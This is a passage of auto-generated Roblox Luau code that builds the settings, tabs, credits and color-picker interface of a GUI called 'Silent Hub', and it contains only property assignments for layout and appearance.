G2L["36"]["BackgroundTransparency"] = 0.85;
G2L["36"]["Size"] = UDim2.new(0, 62, 0, 24);
G2L["36"]["LayoutOrder"] = 2;
G2L["36"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["36"]["Text"] = [[Cancel]];
G2L["36"]["Name"] = [[Close]];
G2L["36"]["Position"] = UDim2.new(0.56314, 0, 0.78102, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.OptContainer.Options.Close.UICorner
G2L["37"] = Instance.new("UICorner", G2L["36"]);
G2L["37"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.OptContainer.Options.TextBox
G2L["38"] = Instance.new("TextBox", G2L["32"]);
G2L["38"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["38"]["ZIndex"] = 26;
G2L["38"]["BorderSizePixel"] = 0;
G2L["38"]["TextSize"] = 18;
G2L["38"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["38"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["38"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["38"]["Size"] = UDim2.new(0, 145, 0, 19);
G2L["38"]["Position"] = UDim2.new(0.03226, 0, 0.22628, 0);
G2L["38"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["38"]["Text"] = [[]];
G2L["38"]["LayoutOrder"] = 26;
G2L["38"]["BackgroundTransparency"] = 0.7;


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.OptContainer.Options.TextBox.UICorner
G2L["39"] = Instance.new("UICorner", G2L["38"]);
G2L["39"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.OptContainer.Options.scrName
G2L["3a"] = Instance.new("TextLabel", G2L["32"]);
G2L["3a"]["BorderSizePixel"] = 0;
G2L["3a"]["TextSize"] = 18;
G2L["3a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3a"]["BackgroundTransparency"] = 1;
G2L["3a"]["Size"] = UDim2.new(0, 155, 0, 31);
G2L["3a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3a"]["Text"] = [[Script Name]];
G2L["3a"]["Name"] = [[scrName]];


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.OptContainer.Options.Dest
G2L["3b"] = Instance.new("TextButton", G2L["32"]);
G2L["3b"]["BorderSizePixel"] = 0;
G2L["3b"]["TextSize"] = 21;
G2L["3b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b"]["BackgroundColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3b"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["3b"]["ZIndex"] = 26;
G2L["3b"]["BackgroundTransparency"] = 0.85;
G2L["3b"]["Size"] = UDim2.new(0, 145, 0, 30);
G2L["3b"]["LayoutOrder"] = 2;
G2L["3b"]["BorderColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3b"]["Text"] = [[Destroy Tab]];
G2L["3b"]["Name"] = [[Dest]];
G2L["3b"]["Position"] = UDim2.new(0.03226, 0, 0.45255, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container2.OptContainer.Options.Dest.UICorner
G2L["3c"] = Instance.new("UICorner", G2L["3b"]);
G2L["3c"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container3
G2L["3d"] = Instance.new("Frame", G2L["f"]);
G2L["3d"]["Active"] = true;
G2L["3d"]["BorderSizePixel"] = 0;
G2L["3d"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["3d"]["ClipsDescendants"] = true;
G2L["3d"]["Size"] = UDim2.new(0, 515, 0, 282);
G2L["3d"]["Position"] = UDim2.new(0.015, 0, 0.02, 0);
G2L["3d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3d"]["Name"] = [[Container3]];
G2L["3d"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Silent Hub.UI.Interface.Container.Container3.UICorner
G2L["3e"] = Instance.new("UICorner", G2L["3d"]);
G2L["3e"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container3.ScrollingFrame
G2L["3f"] = Instance.new("ScrollingFrame", G2L["3d"]);
G2L["3f"]["Active"] = true;
G2L["3f"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
G2L["3f"]["ZIndex"] = 20;
G2L["3f"]["BorderSizePixel"] = 0;
G2L["3f"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["3f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["3f"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["3f"]["Size"] = UDim2.new(0, 500, 0, 241);
G2L["3f"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3f"]["Position"] = UDim2.new(0.014, 0, 0.121, 0);
G2L["3f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["3f"]["ScrollBarThickness"] = 0;
G2L["3f"]["BackgroundTransparency"] = 0.9;


-- StarterGui.Silent Hub.UI.Interface.Container.Container3.ScrollingFrame.UICorner
G2L["40"] = Instance.new("UICorner", G2L["3f"]);
G2L["40"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container3.TextBox
G2L["41"] = Instance.new("TextBox", G2L["3d"]);
G2L["41"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["41"]["ZIndex"] = 20;
G2L["41"]["BorderSizePixel"] = 0;
G2L["41"]["TextSize"] = 14;
G2L["41"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["41"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["41"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["41"]["Size"] = UDim2.new(1.0107, -20, 0, 22);
G2L["41"]["Position"] = UDim2.new(0.013, 0, 0.025, 0);
G2L["41"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["41"]["Text"] = [[]];
G2L["41"]["BackgroundTransparency"] = 0.9;


-- StarterGui.Silent Hub.UI.Interface.Container.Container3.TextBox.UICorner
G2L["42"] = Instance.new("UICorner", G2L["41"]);
G2L["42"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container4
G2L["43"] = Instance.new("Frame", G2L["f"]);
G2L["43"]["Active"] = true;
G2L["43"]["BorderSizePixel"] = 0;
G2L["43"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["43"]["ClipsDescendants"] = true;
G2L["43"]["Size"] = UDim2.new(0, 515, 0, 282);
G2L["43"]["Position"] = UDim2.new(0.015, 0, 0.02, 0);
G2L["43"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["43"]["Name"] = [[Container4]];
G2L["43"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Silent Hub.UI.Interface.Container.Container4.UICorner
G2L["44"] = Instance.new("UICorner", G2L["43"]);
G2L["44"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container4.ScrollingFrame
G2L["45"] = Instance.new("ScrollingFrame", G2L["43"]);
G2L["45"]["Active"] = true;
G2L["45"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
G2L["45"]["ZIndex"] = 20;
G2L["45"]["BorderSizePixel"] = 0;
G2L["45"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["45"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["45"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["45"]["Size"] = UDim2.new(0, 500, 0, 241);
G2L["45"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45"]["Position"] = UDim2.new(0.014, 0, 0.121, 0);
G2L["45"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["45"]["ScrollBarThickness"] = 0;
G2L["45"]["BackgroundTransparency"] = 0.9;


-- StarterGui.Silent Hub.UI.Interface.Container.Container4.ScrollingFrame.UICorner
G2L["46"] = Instance.new("UICorner", G2L["45"]);
G2L["46"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container4.TextBox
G2L["47"] = Instance.new("TextBox", G2L["43"]);
G2L["47"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["47"]["ZIndex"] = 20;
G2L["47"]["BorderSizePixel"] = 0;
G2L["47"]["TextSize"] = 14;
G2L["47"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["47"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["47"]["Size"] = UDim2.new(1.0107, -20, 0, 22);
G2L["47"]["Position"] = UDim2.new(0.013, 0, 0.025, 0);
G2L["47"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["47"]["Text"] = [[]];
G2L["47"]["BackgroundTransparency"] = 0.9;


-- StarterGui.Silent Hub.UI.Interface.Container.Container4.TextBox.UICorner
G2L["48"] = Instance.new("UICorner", G2L["47"]);
G2L["48"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container5
G2L["49"] = Instance.new("Frame", G2L["f"]);
G2L["49"]["Active"] = true;
G2L["49"]["BorderSizePixel"] = 0;
G2L["49"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["49"]["ClipsDescendants"] = true;
G2L["49"]["Size"] = UDim2.new(0, 515, 0, 282);
G2L["49"]["Position"] = UDim2.new(0.015, 0, 0.02, 0);
G2L["49"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["49"]["Name"] = [[Container5]];
G2L["49"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Silent Hub.UI.Interface.Container.Container5.UICorner
G2L["4a"] = Instance.new("UICorner", G2L["49"]);
G2L["4a"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container5.ScrollingFrame
G2L["4b"] = Instance.new("ScrollingFrame", G2L["49"]);
G2L["4b"]["Active"] = true;
G2L["4b"]["ScrollingDirection"] = Enum.ScrollingDirection.Y;
G2L["4b"]["ZIndex"] = 20;
G2L["4b"]["BorderSizePixel"] = 0;
G2L["4b"]["CanvasSize"] = UDim2.new(0, 0, 0, 0);
G2L["4b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4b"]["AutomaticCanvasSize"] = Enum.AutomaticSize.Y;
G2L["4b"]["Size"] = UDim2.new(0, 500, 0, 241);
G2L["4b"]["ScrollBarImageColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4b"]["Position"] = UDim2.new(0.014, 0, 0.121, 0);
G2L["4b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4b"]["ScrollBarThickness"] = 0;
G2L["4b"]["BackgroundTransparency"] = 0.9;


-- StarterGui.Silent Hub.UI.Interface.Container.Container5.ScrollingFrame.UICorner
G2L["4c"] = Instance.new("UICorner", G2L["4b"]);
G2L["4c"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container5.TextBox
G2L["4d"] = Instance.new("TextBox", G2L["49"]);
G2L["4d"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["4d"]["ZIndex"] = 20;
G2L["4d"]["BorderSizePixel"] = 0;
G2L["4d"]["TextSize"] = 14;
G2L["4d"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["4d"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["4d"]["Size"] = UDim2.new(1.0107, -20, 0, 22);
G2L["4d"]["Position"] = UDim2.new(0.013, 0, 0.025, 0);
G2L["4d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4d"]["Text"] = [[]];
G2L["4d"]["BackgroundTransparency"] = 0.9;


-- StarterGui.Silent Hub.UI.Interface.Container.Container5.TextBox.UICorner
G2L["4e"] = Instance.new("UICorner", G2L["4d"]);
G2L["4e"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6
G2L["4f"] = Instance.new("Frame", G2L["f"]);
G2L["4f"]["Active"] = true;
G2L["4f"]["BorderSizePixel"] = 0;
G2L["4f"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["4f"]["ClipsDescendants"] = true;
G2L["4f"]["Size"] = UDim2.new(0, 515, 0, 282);
G2L["4f"]["Position"] = UDim2.new(0.015, 0, 0.02, 0);
G2L["4f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["4f"]["Name"] = [[Container6]];
G2L["4f"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.UICorner
G2L["50"] = Instance.new("UICorner", G2L["4f"]);
G2L["50"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.TextLabel
G2L["51"] = Instance.new("TextLabel", G2L["4f"]);
G2L["51"]["ZIndex"] = 20;
G2L["51"]["BorderSizePixel"] = 0;
G2L["51"]["TextSize"] = 14;
G2L["51"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["51"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["51"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["51"]["BackgroundTransparency"] = 1;
G2L["51"]["Size"] = UDim2.new(0, 200, 0, 25);
G2L["51"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["51"]["Text"] = [[Inactive Fade:]];
G2L["51"]["Position"] = UDim2.new(0.47578, 0, 0.65267, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.TextLabel
G2L["52"] = Instance.new("TextLabel", G2L["4f"]);
G2L["52"]["ZIndex"] = 20;
G2L["52"]["BorderSizePixel"] = 0;
G2L["52"]["TextSize"] = 14;
G2L["52"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["52"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["52"]["BackgroundTransparency"] = 1;
G2L["52"]["Size"] = UDim2.new(0, 200, 0, 25);
G2L["52"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["52"]["Text"] = [[Toggle Scrolling:]];
G2L["52"]["Position"] = UDim2.new(0.14569, 0, 0.65456, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.TextLabel
G2L["53"] = Instance.new("TextLabel", G2L["4f"]);
G2L["53"]["ZIndex"] = 20;
G2L["53"]["BorderSizePixel"] = 0;
G2L["53"]["TextSize"] = 14;
G2L["53"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["53"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["53"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["53"]["BackgroundTransparency"] = 1;
G2L["53"]["Size"] = UDim2.new(0, 200, 0, 25);
G2L["53"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["53"]["Text"] = [[GUI Scale:]];
G2L["53"]["Position"] = UDim2.new(0.31073, 0, 0.42857, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.TextLabel
G2L["54"] = Instance.new("TextLabel", G2L["4f"]);
G2L["54"]["ZIndex"] = 20;
G2L["54"]["BorderSizePixel"] = 0;
G2L["54"]["TextSize"] = 14;
G2L["54"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["54"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["54"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["54"]["BackgroundTransparency"] = 1;
G2L["54"]["Size"] = UDim2.new(0, 200, 0, 25);
G2L["54"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["54"]["Text"] = [[Target Username:]];
G2L["54"]["Position"] = UDim2.new(0.31073, 0, 0.20677, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.UserTarget
G2L["55"] = Instance.new("TextBox", G2L["4f"]);
G2L["55"]["CursorPosition"] = -1;
G2L["55"]["Name"] = [[UserTarget]];
G2L["55"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["55"]["ZIndex"] = 20;
G2L["55"]["BorderSizePixel"] = 0;
G2L["55"]["TextSize"] = 14;
G2L["55"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["55"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["55"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["55"]["PlaceholderText"] = [[Input Username]];
G2L["55"]["Size"] = UDim2.new(0, 154, 0, 31);
G2L["55"]["Position"] = UDim2.new(0.35405, 0, 0.30075, 0);
G2L["55"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["55"]["Text"] = [[]];
G2L["55"]["BackgroundTransparency"] = 0.9;


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.UserTarget.UICorner
G2L["56"] = Instance.new("UICorner", G2L["55"]);
G2L["56"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.ResetSettings
G2L["57"] = Instance.new("TextButton", G2L["4f"]);
G2L["57"]["BorderSizePixel"] = 0;
G2L["57"]["TextSize"] = 14;
G2L["57"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["57"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["57"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["57"]["ZIndex"] = 20;
G2L["57"]["BackgroundTransparency"] = 0.9;
G2L["57"]["Size"] = UDim2.new(0, 144, 0, 31);
G2L["57"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["57"]["Text"] = [[Reset Settings]];
G2L["57"]["Name"] = [[ResetSettings]];
G2L["57"]["Position"] = UDim2.new(0.52979, 0, 0.06788, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.ResetSettings.UICorner
G2L["58"] = Instance.new("UICorner", G2L["57"]);
G2L["58"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.GUIScale
G2L["59"] = Instance.new("TextBox", G2L["4f"]);
G2L["59"]["CursorPosition"] = -1;
G2L["59"]["Name"] = [[GUIScale]];
G2L["59"]["PlaceholderColor3"] = Color3.fromRGB(179, 179, 179);
G2L["59"]["ZIndex"] = 20;
G2L["59"]["BorderSizePixel"] = 0;
G2L["59"]["TextSize"] = 14;
G2L["59"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["59"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["59"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["59"]["ClearTextOnFocus"] = false;
G2L["59"]["PlaceholderText"] = [[GUI Scale]];
G2L["59"]["Size"] = UDim2.new(0, 154, 0, 31);
G2L["59"]["Position"] = UDim2.new(0.35405, 0, 0.5188, 0);
G2L["59"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["59"]["Text"] = [[]];
G2L["59"]["BackgroundTransparency"] = 0.9;


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.GUIScale.UICorner
G2L["5a"] = Instance.new("UICorner", G2L["59"]);
G2L["5a"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.ColorPicker
G2L["5b"] = Instance.new("TextButton", G2L["4f"]);
G2L["5b"]["BorderSizePixel"] = 0;
G2L["5b"]["TextSize"] = 14;
G2L["5b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["5b"]["ZIndex"] = 20;
G2L["5b"]["BackgroundTransparency"] = 0.9;
G2L["5b"]["Size"] = UDim2.new(0, 144, 0, 31);
G2L["5b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5b"]["Text"] = [[Color Picker]];
G2L["5b"]["Name"] = [[ColorPicker]];
G2L["5b"]["Position"] = UDim2.new(0.19829, 0, 0.06788, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.ColorPicker.UICorner
G2L["5c"] = Instance.new("UICorner", G2L["5b"]);
G2L["5c"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.Toggle2
G2L["5d"] = Instance.new("Frame", G2L["4f"]);
G2L["5d"]["ZIndex"] = 20;
G2L["5d"]["BorderSizePixel"] = 0;
G2L["5d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5d"]["Size"] = UDim2.new(0, 45, 0, 16);
G2L["5d"]["Position"] = UDim2.new(0.62462, 0, 0.74311, 0);
G2L["5d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5d"]["Name"] = [[Toggle2]];
G2L["5d"]["BackgroundTransparency"] = 0.9;


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.Toggle2.UICorner
G2L["5e"] = Instance.new("UICorner", G2L["5d"]);
G2L["5e"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.Toggle2.ToggleButton
G2L["5f"] = Instance.new("TextButton", G2L["5d"]);
G2L["5f"]["BorderSizePixel"] = 0;
G2L["5f"]["TextSize"] = 14;
G2L["5f"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["5f"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["5f"]["Size"] = UDim2.new(0, 20, 0, 16);
G2L["5f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["5f"]["Text"] = [[]];
G2L["5f"]["Name"] = [[ToggleButton]];
G2L["5f"]["Position"] = UDim2.new(-0.011, 0, 0, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.Toggle2.ToggleButton.UICorner
G2L["60"] = Instance.new("UICorner", G2L["5f"]);
G2L["60"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.Toggle
G2L["61"] = Instance.new("Frame", G2L["4f"]);
G2L["61"]["ZIndex"] = 20;
G2L["61"]["BorderSizePixel"] = 0;
G2L["61"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["61"]["Size"] = UDim2.new(0, 45, 0, 16);
G2L["61"]["Position"] = UDim2.new(0.29452, 0, 0.74145, 0);
G2L["61"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["61"]["Name"] = [[Toggle]];
G2L["61"]["BackgroundTransparency"] = 0.9;


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.Toggle.UICorner
G2L["62"] = Instance.new("UICorner", G2L["61"]);
G2L["62"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.Toggle.ToggleButton
G2L["63"] = Instance.new("TextButton", G2L["61"]);
G2L["63"]["BorderSizePixel"] = 0;
G2L["63"]["TextSize"] = 14;
G2L["63"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
G2L["63"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["63"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
G2L["63"]["Size"] = UDim2.new(0, 20, 0, 16);
G2L["63"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["63"]["Text"] = [[]];
G2L["63"]["Name"] = [[ToggleButton]];
G2L["63"]["Position"] = UDim2.new(-0.011, 0, 0, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.Toggle.ToggleButton.UICorner
G2L["64"] = Instance.new("UICorner", G2L["63"]);
G2L["64"]["CornerRadius"] = UDim.new(0, 100);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.SaveSettings
G2L["65"] = Instance.new("TextButton", G2L["4f"]);
G2L["65"]["BorderSizePixel"] = 0;
G2L["65"]["TextSize"] = 14;
G2L["65"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["65"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["65"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["65"]["ZIndex"] = 20;
G2L["65"]["BackgroundTransparency"] = 0.9;
G2L["65"]["Size"] = UDim2.new(0, 201, 0, 31);
G2L["65"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["65"]["Text"] = [[Save Settings]];
G2L["65"]["Name"] = [[SaveSettings]];
G2L["65"]["Position"] = UDim2.new(0.30703, 0, 0.84448, 0);


-- StarterGui.Silent Hub.UI.Interface.Container.Container6.SaveSettings.UICorner
G2L["66"] = Instance.new("UICorner", G2L["65"]);
G2L["66"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container7
G2L["67"] = Instance.new("Frame", G2L["f"]);
G2L["67"]["Active"] = true;
G2L["67"]["BorderSizePixel"] = 0;
G2L["67"]["BackgroundColor3"] = Color3.fromRGB(31, 31, 31);
G2L["67"]["ClipsDescendants"] = true;
G2L["67"]["Size"] = UDim2.new(0, 515, 0, 282);
G2L["67"]["Position"] = UDim2.new(0.015, 0, 0.02, 0);
G2L["67"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["67"]["Name"] = [[Container7]];
G2L["67"]["BackgroundTransparency"] = 0.5;


-- StarterGui.Silent Hub.UI.Interface.Container.Container7.UICorner
G2L["68"] = Instance.new("UICorner", G2L["67"]);
G2L["68"]["CornerRadius"] = UDim.new(0, 15);


-- StarterGui.Silent Hub.UI.Interface.Container.Container7.Credits
G2L["69"] = Instance.new("TextLabel", G2L["67"]);
G2L["69"]["TextWrapped"] = true;
G2L["69"]["BorderSizePixel"] = 0;
G2L["69"]["TextSize"] = 27;
G2L["69"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["69"]["FontFace"] = Font.new([[rbxassetid://16658221428]], Enum.FontWeight.Bold, Enum.FontStyle.Normal);
G2L["69"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
G2L["69"]["BackgroundTransparency"] = 1;
G2L["69"]["RichText"] = true;
G2L["69"]["Size"] = UDim2.new(0, 515, 0, 137);
G2L["69"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["69"]["Text"] = [[Silent Hub is developed by Lynx, certain aspects are taken from Rose Hub.<br/><br/> Script credits go to their respective creators.]];
G2L["69"]["Name"] = [[Credits]];


-- StarterGui.Silent Hub.UI.Interface.Container.Container7.ImageLabel
G2L["6a"] = Instance.new("ImageLabel", G2L["67"]);
G2L["6a"]["BorderSizePixel"] = 0;
G2L["6a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
G2L["6a"]["Image"] = [[rbxassetid://71596851736559]];
G2L["6a"]["Size"] = UDim2.new(0, 150, 0, 150);
G2L["6a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
G2L["6a"]["BackgroundTransparency"] = 1;
G2L["6a"]["Position"] = UDim2.new(0.3534, 0, 0.44326, 0);


-- StarterGui.Silent Hub.UI.ColorPick
G2L["6b"] = Instance.new("ScreenGui", G2L["2"]);
G2L["6b"]["Enabled"] = false;
G2L["6b"]["Name"] = [[ColorPick]];


-- StarterGui.Silent Hub.UI.ColorPick.LocalScript
G2L["6c"] = Instance.new("LocalScript", G2L["6b"]);



-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker
G2L["6d"] = Instance.new("Frame", G2L["6b"]);
G2L["6d"]["BorderSizePixel"] = 0;
G2L["6d"]["BackgroundColor3"] = Color3.fromRGB(101, 101, 101);
G2L["6d"]["Size"] = UDim2.new(0, 450, 0, 330);
G2L["6d"]["Position"] = UDim2.new(0.37, 0, 0.3, 0);
G2L["6d"]["BorderColor3"] = Color3.fromRGB(28, 43, 54);
G2L["6d"]["Name"] = [[ColorPicker]];
G2L["6d"]["BackgroundTransparency"] = 1;


-- StarterGui.Silent Hub.UI.ColorPick.ColorPicker.TopBar
G2L["6e"] = Instance.new("Frame", G2L["6d"]);
G2L["6e"]["BorderSizePixel"] = 0;
